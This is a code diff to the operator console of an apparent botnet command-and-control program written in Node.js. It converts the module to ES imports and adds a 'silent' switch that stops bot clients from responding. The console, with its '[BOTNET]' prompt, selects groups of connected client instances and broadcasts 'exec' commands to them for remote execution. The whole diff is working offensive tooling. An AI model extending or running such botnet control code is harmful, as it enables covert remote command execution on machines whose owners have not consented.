@@ -1,9 +1,11 @@
-const readline = require("readline").createInterface({
+import readline from "readline";
+import fs from "fs";
+import { clientModules, broadcast } from "./server.js";
+
+const rl = readline.createInterface({
 	input: process.stdin,
 	output: process.stdout,
 });
-const fs = require("fs");
-const server = require("./server.js");
 
 const help = fs.readFileSync("../config/help", "utf8");
 
@@ -23,28 +25,35 @@ const commandsHelp = [
 		functionality: "Shows you how to use commands",
 		usage: "help <command>",
 	},
+	{
+		command: "silent",
+		functionality: "Silents clients from responding",
+		usage: "silent (boolean)",
+	}
 ];
 
-function prompt() {
-	readline.question("[BOTNET] ", (message) => {
+export default function prompt() {
+	rl.question("[BOTNET] ", (message) => {
 		message = message.toLowerCase();
 
-		if (message === "instances") {
-			console.log(`Instances: ${clientInstances.length}`);
-		}
-
 		if (message.startsWith("instances")) {
-			if (message.split(" ")[1] <= clients.length) {
-				clientInstances = [...clients];
-				clientInstances = clientInstances.slice(0, message.split(" ")[1]);
+			if (message === "instances") {
+				console.log(`Instances: ${clientModules.clientInstances.length}`);
+			}
+			if (message.split(" ")[1] <= clientModules.clients.length) {
+				clientModules.clientInstances = [...clientModules.clients];
+				clientModules.clientInstances = clientModules.clientInstances.slice(
+					0,
+					message.split(" ")[1]
+				);
 			}
 		}
 
-		if (message.split(" ")[1] === "all") clientInstances = [...clients];
-
-		if (message === "help") console.log(`\n${help}`);
+		if (message.split(" ")[1] === "all")
+			clientModules.clientInstances = [...clientModules.clients];
 
 		if (message.startsWith("help")) {
+			if (message === "help") console.log(`\n${help}`);
 			if (
 				commandsHelp.filter((i) => i.command === message.split(" ")[1]).length >
 				0
@@ -59,12 +68,17 @@ function prompt() {
 			}
 		}
 
-		if (message.startsWith("exec")) server.broadcast(message);
+		if (message.startsWith("silent")) {
+			if (message === "silent") console.log(`silent: ${clientModules.silent}`);
+			if (message.split(" ")[1] === "true") {
+				clientModules.silent = true;
+			} else if (message.split(" ")[1] === "false") {
+				clientModules.silent = false;
+			}
+		}
+
+		if (message.startsWith("exec")) broadcast(message);
 
 		return prompt();
 	});
 }
-
-module.exports = {
-	prompt: prompt,
-};
